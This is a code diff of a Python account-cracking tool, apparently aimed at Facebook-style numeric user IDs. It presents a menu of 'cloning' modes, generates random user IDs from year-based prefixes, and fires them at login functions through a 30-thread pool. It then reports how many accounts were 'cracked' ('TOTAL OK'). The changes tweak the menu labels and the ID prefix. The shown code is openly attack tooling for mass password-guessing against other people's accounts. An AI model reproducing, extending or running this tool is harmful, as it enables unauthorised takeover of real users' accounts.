@@ -694,16 +694,16 @@ def main():
 def main():	    
     clear()
     print(
-        f'\x1b[38;5;46m[\033[1;97m1\x1b[38;5;46m] \033[1;97mBRUTE_CLONING \x1b[38;5;46m[\x1b[38;5;46m2009\x1b[38;5;46m/\x1b[38;5;46m2009-2010\x1b[38;5;46m]\033[1;97m'
+        f'\x1b[38;5;46m[\033[1;97m1\x1b[38;5;46m] \033[1;97mBRUTE_CLONING \x1b[38;5;46m[\x1b[38;5;46m/\x1b[38;5;46m/\x1b[38;5;46m2009-2010\x1b[38;5;46m]\033[1;97m'
 	    )
     print(
-        f'\x1b[38;5;46m[\033[1;97m2\x1b[38;5;46m] \033[1;97mOLD CLONING \x1b[38;5;46m[\x1b[38;5;46m2011\x1b[38;5;46m/\x1b[38;5;46m2011-2012\x1b[38;5;46m]\033[1;97m'
+        f'\x1b[38;5;46m[\033[1;97m2\x1b[38;5;46m] \033[1;97mOLD CLONING \x1b[38;5;46m[\x1b[38;5;46m/\x1b[38;5;46m/\x1b[38;5;46m2011-2012\x1b[38;5;46m]\033[1;97m'
     )
     print(
-        f'\x1b[38;5;46m[\033[1;97m3\x1b[38;5;46m] \033[1;97mMIX CLONING \x1b[38;5;46m[\x1b[38;5;46m2013\x1b[38;5;46m/\x1b[38;5;46m2013-2015\x1b[38;5;46m]\033[1;97m'
+        f'\x1b[38;5;46m[\033[1;97m3\x1b[38;5;46m] \033[1;97mMIX CLONING \x1b[38;5;46m[\x1b[38;5;46m/\x1b[38;5;46m/\x1b[38;5;46m2013-2015\x1b[38;5;46m]\033[1;97m'
     )
     print(
-        f'\x1b[38;5;46m[\033[1;97m4\x1b[38;5;46m] \033[1;97mRANDOM CLONING \x1b[38;5;46m[\x1b[38;5;46m2016\x1b[38;5;46m/\x1b[38;5;46m2017-2018\x1b[38;5;46m]\033[1;97m'
+        f'\x1b[38;5;46m[\033[1;97m4\x1b[38;5;46m] \033[1;97mRANDOM CLONING \x1b[38;5;46m[\x1b[38;5;46m/\x1b[38;5;46m/\x1b[38;5;46m2017-2018\x1b[38;5;46m]\033[1;97m'
     )
     print(
         f'\x1b[38;5;46m[\033[1;97m5\x1b[38;5;46m] \033[1;97mEXIT PROGRAM\033[1;97m'
@@ -750,7 +750,7 @@ def OLD_CLONING():
     linex()
     limit = input(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mSELECTION \33[38;5;46m▶ \033[1;97m')
     linex()
-    year_code = '100001'
+    year_code = '10000'
     for i in range(int(limit)):
     	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
     with tred(max_workers=30) as jihad:
@@ -770,7 +770,7 @@ def MIX_CLONING():
     linex()
     limit=input(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mSELECTION \33[38;5;46m▶ \033[1;97m')
     linex()
-    year_code = '100002'
+    year_code = '10000'
     for i in range(int(limit)):
         data=str(random.choice(range(1000000000,1999999999)))
         user.append(data)
@@ -796,7 +796,7 @@ def RANDOM_CLONING():
     linex()
     limit=input(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mSELECTION \33[38;5;46m▶ \033[1;97m')
     linex()
-    year_code = '100005'
+    year_code = '10000'
     for i in range(int(limit)):
     	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
     with tred(max_workers=30) as jihad:
@@ -808,6 +808,7 @@ def RANDOM_CLONING():
             uid=year_code+mal
             jihad.submit(login4,uid)            
     line();print(f'\r\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;46m!');linex();print(f'\r\r\r\r\33[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mTOTAL OK \33[38;5;46m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;46m!\033[1;37m');main()
+	
 def login1(uid):
     global oks, loop, cps
     Session = requests.session()
